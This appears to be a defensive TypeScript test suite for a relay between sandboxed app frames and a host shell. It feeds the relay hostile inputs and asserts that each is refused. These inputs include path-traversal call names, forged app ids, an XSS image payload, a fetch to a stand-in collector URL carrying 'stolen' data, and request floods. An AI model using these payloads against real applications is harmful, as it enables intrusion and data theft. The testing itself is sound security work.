// The frame's side is hostile here. Each test tries one way of getting the
// shell to do something for an app that the owner did not agree to.

import assert from "node:assert/strict";
import { test } from "node:test";
import { DEFAULT_LIMITS, REFUSALS, createRelay, isFromFrame, isHello } from "../src/modules/apps/lib/bridge.ts";
import type { BridgeResponse, Grant, RelayOptions } from "../src/modules/apps/lib/bridge.ts";

type Sent = { appId: string; call: string; args: unknown };

function harness(overrides: Partial<RelayOptions> = {}, grant: Grant = { tier: "sandboxed", permissions: ["tasks.write"] }) {
  const sent: Sent[] = [];
  const posted: BridgeResponse[] = [];
  const clock = { now: 1_000_000 };
  const relay = createRelay({
    appId: "water",
    grant,
    send: async (appId, call, args) => {
      sent.push({ appId, call, args });
      return { ok: true, result: "done" };
    },
    post: (response) => posted.push(response),
    now: () => clock.now,
    ...overrides,
  });
  return { relay, sent, posted, clock };
}

const errorOf = (response: BridgeResponse | undefined) => (response && !response.ok ? response.error : undefined);

test("an honest request reaches the server once, as the app the frame was mounted for, and gets one answer", async () => {
  const { relay, sent, posted } = harness();
  await relay.handle({ id: 1, call: "storage.set", args: { key: "day", value: 3 } });
  assert.deepEqual(sent, [{ appId: "water", call: "storage.set", args: { key: "day", value: 3 } }]);
  assert.deepEqual(posted, [{ id: 1, ok: true, result: "done" }]);
});

test("a message from another window is not heard, whatever it says", () => {
  const frame = { frame: true };
  const attacker = { attacker: true };
  const hello = { jimmyhq: 1, hello: true };
  assert.equal(isHello(hello), true);
  // Another tab, a popup, a frame inside the app's frame, or the shell itself.
  for (const source of [attacker, null, globalThis]) {
    assert.equal(isFromFrame({ source, origin: "null" }, frame), false);
    assert.equal(isFromFrame({ source, origin: "http://127.0.0.1:8440" }, frame), false);
  }
  // A bridge request sent as a window message is not a hello, even from the frame.
  assert.equal(isHello({ id: 1, call: "storage.get", args: {} }), false);
});

test("a forged app id is refused, and no field of a message can change who the request is made as", async () => {
  const { relay, sent, posted } = harness();
  const forgeries = [
    { id: 1, call: "storage.get", args: {}, app: "posts" },
    { id: 2, call: "storage.get", args: {}, app_id: "posts" },
    { id: 3, call: "storage.get", args: {}, appId: "posts" },
    { id: 4, call: "storage.get", args: {}, url: "/api/apps/posts/bridge/storage.get" },
    { id: 5, call: "storage.get", args: {}, jimmyhq: 1 },
  ];
  for (const message of forgeries) await relay.handle(message);
  assert.deepEqual(sent, []);
  assert.deepEqual(posted.map((response) => errorOf(response)?.code), ["invalid", "invalid", "invalid", "invalid", "invalid"]);

  // Inside args an id is only data: the request still goes out as this frame's app.
  const inside = harness();
  await inside.relay.handle({ id: 6, call: "storage.get", args: { key: "k", app: "posts", app_id: "posts" } });
  assert.equal(inside.sent.length, 1);
  assert.equal(inside.sent[0]?.appId, "water");
});

test("a call name cannot be used to reach another part of the server", async () => {
  const { relay, sent, posted } = harness();
  const names = ["../../settings", "storage.get/../../../auth/tokens", "storage.get?as=owner", "storage.get#", "%2e%2e/settings", "mount", "storage.get\n", " storage.get", "tape.read", "apps.install"];
  let id = 0;
  for (const call of names) await relay.handle({ id: (id += 1), call });
  assert.deepEqual(sent, []);
  assert.equal(posted.length, names.length);
  assert.ok(posted.every((response) => errorOf(response)?.code === "invalid"));
});

test("a malformed message is dropped or refused and never reaches the server", async () => {
  const { relay, sent, posted } = harness({ limits: { callsPerSecond: 1000 } });
  const junk: unknown[] = [
    null, undefined, 0, "storage.get", [], [{ id: 1, call: "storage.get" }], () => 1, new Map([["id", 1]]), new Date(),
    {}, { call: "storage.get" }, { id: null, call: "storage.get" }, { id: {}, call: "storage.get" }, { id: -1, call: "storage.get" },
    { id: 1 }, { id: 1, call: 7 }, { id: 1, call: ["storage.get"] }, { id: 1, call: { toString: () => "storage.get" } },
    { id: 1, call: "storage.set", args: { value: new Date() } }, { id: 1, call: "storage.set", args: { value: () => 1 } },
    { id: 1, call: "storage.set", args: new Map() }, { id: 1, call: "storage.set", args: { value: new Uint8Array(8) } },
    Object.create({ id: 1, call: "storage.get" }),
  ];
  for (const message of junk) await relay.handle(message);
  assert.deepEqual(sent, []);
  // Only a message with a usable id gets an answer; the rest cannot be matched to anything.
  assert.ok(posted.every((response) => errorOf(response)?.code === "invalid"));
  assert.equal(posted.length, 8);
});

test("a message that throws when it is read is refused without taking the shell down", async () => {
  const { relay, sent } = harness();
  const trap = new Proxy({}, { get: () => { throw new Error("gotcha"); }, ownKeys: () => { throw new Error("gotcha"); }, getPrototypeOf: () => Object.prototype });
  await assert.doesNotReject(relay.handle(trap));
  assert.deepEqual(sent, []);
});

test("an oversized message is refused before anything is sent", async () => {
  const { relay, sent, posted } = harness();
  await relay.handle({ id: 1, call: "storage.set", args: { key: "k", value: "x".repeat(DEFAULT_LIMITS.maxBytes + 1) } });
  await relay.handle({ id: 2, call: "storage.set", args: { key: "k", value: Array.from({ length: 300_000 }, () => "pad!") } });
  await relay.handle({ id: 3, call: "storage.set", args: { key: "k", value: "😀".repeat(300_000) } });
  assert.deepEqual(sent, []);
  assert.deepEqual(posted.map((response) => errorOf(response)?.code), ["too_large", "too_large", "too_large"]);
  assert.equal(errorOf(posted[0])?.message, REFUSALS.tooLarge);
});

test("a method the app has no permission for is refused before the server is asked", async () => {
  const { relay, sent, posted } = harness();
  const attempts = [
    { id: 1, call: "tasks.list", args: {} },
    { id: 2, call: "bench.file", args: { kind: "draft", title: "Approve me" } },
    { id: 3, call: "model.ask", args: { prompt: "Tell me about the owner" } },
    { id: 4, call: "memory.recall", args: { query: "passwords" } },
    { id: 5, call: "net.fetch", args: { url: "https://collector.example/?d=stolen" } },
    { id: 6, call: "app.call", args: { name: "anything" } },
  ];
  for (const message of attempts) await relay.handle(message);
  assert.deepEqual(sent, []);
  assert.deepEqual(posted.map((response) => errorOf(response)?.code), Array(6).fill("not_allowed"));
  for (const response of posted) assert.match(errorOf(response)?.message ?? "", /nothing was done/);

  await relay.handle({ id: 7, call: "tasks.create", args: { title: "Keep drinking water" } });
  assert.equal(sent.length, 1);
});

test("a permission claimed in the message is worth nothing", async () => {
  const { relay, sent } = harness();
  await relay.handle({ id: 1, call: "model.ask", args: { prompt: "hi", permissions: ["model.ask"], tier: "full" } });
  await relay.handle({ id: 2, call: "model.ask", args: {}, permissions: ["model.ask"] });
  assert.deepEqual(sent, []);
});

test("a flood is cut to the limit: the rest are told to wait, then not answered at all", async () => {
  const { relay, sent, posted, clock } = harness();
  const flood = Array.from({ length: 1000 }, (_, i) => relay.handle({ id: i, call: "storage.get", args: { key: "k" } }));
  await Promise.all(flood);
  assert.equal(sent.length, DEFAULT_LIMITS.callsPerSecond);
  const refused = posted.filter((response) => !response.ok);
  assert.equal(refused.length, DEFAULT_LIMITS.silentAfter);
  assert.ok(refused.every((response) => errorOf(response)?.code === "quota" && (errorOf(response)?.retry_after_s ?? 0) >= 1));
  assert.equal(posted.length, DEFAULT_LIMITS.callsPerSecond + DEFAULT_LIMITS.silentAfter);

  // Junk counts against the limit too, so a flood of it buys no free work.
  clock.now += 5000;
  const junk = Array.from({ length: 500 }, () => relay.handle({ id: 1, call: "nope", args: "x".repeat(1000) }));
  await Promise.all(junk);
  clock.now += 5000;
  await relay.handle({ id: "after", call: "storage.get", args: { key: "k" } });
  assert.equal(sent.length, DEFAULT_LIMITS.callsPerSecond + 1);
});

test("slow answers cannot be piled up without end", async () => {
  const release: (() => void)[] = [];
  const { relay, sent, posted, clock } = harness({
    send: async (appId, call, args) => {
      sent.push({ appId, call, args });
      await new Promise<void>((resolve) => release.push(resolve));
      return { ok: true, result: null };
    },
  });
  const running: Promise<void>[] = [];
  for (let i = 0; i < 60; i += 1) {
    clock.now += 100;
    running.push(relay.handle({ id: i, call: "storage.get", args: {} }));
  }
  assert.equal(relay.inFlight, DEFAULT_LIMITS.maxInFlight);
  assert.equal(sent.length, DEFAULT_LIMITS.maxInFlight);
  assert.equal(posted.filter((response) => errorOf(response)?.message === REFUSALS.busy).length, 60 - DEFAULT_LIMITS.maxInFlight);
  for (const done of release) done();
  await Promise.all(running);
  assert.equal(relay.inFlight, 0);
});

test("an id still waiting for its answer cannot be used again to confuse which answer is which", async () => {
  let finish: (value: unknown) => void = () => undefined;
  const { relay, sent, posted } = harness({
    send: (appId, call, args) => {
      sent.push({ appId, call, args });
      return new Promise((resolve) => {
        finish = resolve;
      });
    },
  });
  const first = relay.handle({ id: 7, call: "storage.get", args: { key: "a" } });
  await relay.handle({ id: 7, call: "storage.delete", args: { key: "a" } });
  assert.equal(sent.length, 1);
  assert.equal(errorOf(posted[0])?.message, REFUSALS.duplicate);
  finish({ ok: true, result: "a" });
  await first;
  assert.deepEqual(posted[1], { id: 7, ok: true, result: "a" });
  // Once answered, the id is free again.
  const again = relay.handle({ id: 7, call: "storage.get", args: { key: "a" } });
  finish({ ok: true, result: "b" });
  await again;
  assert.equal(sent.length, 2);
});

test("after the frame is gone nothing more is sent to the server and a late answer is not delivered", async () => {
  let finish: (value: unknown) => void = () => undefined;
  const { relay, sent, posted } = harness({
    send: (appId, call, args) => {
      sent.push({ appId, call, args });
      return new Promise((resolve) => {
        finish = resolve;
      });
    },
  });
  const waiting = relay.handle({ id: 1, call: "storage.get", args: {} });
  relay.close();
  finish({ ok: true, result: "the previous page's data" });
  await waiting;
  await relay.handle({ id: 2, call: "storage.set", args: { key: "k", value: 1 } });
  assert.equal(sent.length, 1);
  assert.deepEqual(posted, []);
  assert.equal(relay.closed, true);
});

test("a server failure reaches the app as a plain sentence, with nothing of the server in it", async () => {
  const failures: unknown[] = [
    { status: 500, detail: "Traceback (most recent call last): File /srv/app.py" },
    new Error("connect ECONNREFUSED 127.0.0.1:8440"),
    { status: 0, detail: "Cannot reach the server." },
    "boom",
  ];
  for (const failure of failures) {
    const { relay, posted } = harness({ send: () => Promise.reject(failure) });
    await relay.handle({ id: 1, call: "storage.get", args: {} });
    const error = errorOf(posted[0]);
    assert.ok(error?.code === "internal" || error?.code === "unavailable");
    assert.equal(/Traceback|ECONNREFUSED|127\.0\.0\.1|srv/.test(error?.message ?? ""), false);
  }
  const refused = harness({ send: () => Promise.reject({ status: 403, detail: "You may not add tasks. Nothing was added." }) });
  await refused.relay.handle({ id: 1, call: "storage.get", args: {} });
  assert.deepEqual(errorOf(refused.posted[0]), { code: "not_allowed", message: "You may not add tasks. Nothing was added." });
});

test("a toast or a badge is handled by the shell and never becomes a request to the server", async () => {
  const shown: unknown[] = [];
  const { relay, sent, posted } = harness({
    shell: {
      "ui.toast": (args) => {
        shown.push(args);
        return null;
      },
    },
  });
  await relay.handle({ id: 1, call: "ui.toast", args: { message: "<img src=x onerror=alert(1)>" } });
  await relay.handle({ id: 2, call: "ui.badge", args: { count: 2 } });
  assert.deepEqual(sent, []);
  assert.equal(shown.length, 1);
  assert.deepEqual(posted[0], { id: 1, ok: true, result: null });
  // No handler was given for the badge: it is refused, not forwarded.
  assert.equal(errorOf(posted[1])?.code, "unavailable");
});

test("a port that has closed does not break the relay", async () => {
  const { relay } = harness({
    post: () => {
      throw new Error("port closed");
    },
  });
  await assert.doesNotReject(relay.handle({ id: 1, call: "storage.get", args: {} }));
});
